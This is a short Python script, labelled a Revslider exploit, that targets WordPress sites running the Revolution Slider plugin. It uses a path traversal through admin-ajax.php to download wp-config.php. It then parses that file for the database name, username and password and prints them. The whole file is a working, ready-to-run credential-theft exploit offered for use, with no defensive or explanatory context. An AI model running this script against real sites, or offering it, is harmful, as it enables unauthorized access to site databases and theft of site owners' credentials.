import requests
import sys
import os

#tested True =  exploit work


print ("[+] Revslider exploit")
def main():
	target = input("\n[-] Target => ")
	headers = {"User-Agent":"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"}
	data = {'action':'revslider_ajax_action', 'client_action':'update_plugin'}
	ex = "wp-admin/admin-ajax.php?action=revolution-slider_show_image&img=../wp-config.php"
	asu = ("wp-admin/admin-ajax.php")
	################# exploit #############################
	rp = requests.get(target+asu, headers=headers)
	if str(0) in rp.text and rp.status_code != 404:
		rp1 = requests.get(target+ex, headers=headers)
		a = rp1.text
		for item in a.split("\n"):
			if """define('""" in item:
				data = item.strip()
				data = data[7:-2].replace("'", "").split(",")
				if "DB_NAME" == data[0]:
					DB_NAME = data[1]
				elif "DB_USER" == data[0]:
					DB_USER = data[1]
				elif "DB_PASSWORD" == data[0]:
					DB_PASSWORD = data[1]
					print("[+] Revslider Ajax = db_name:{}  db_username:{}  db_Pwd:{} ".format(DB_NAME,DB_USER,DB_PASSWORD))
				else:
					pass
				
	else:
		print("[-] Revslider Ajax")
main()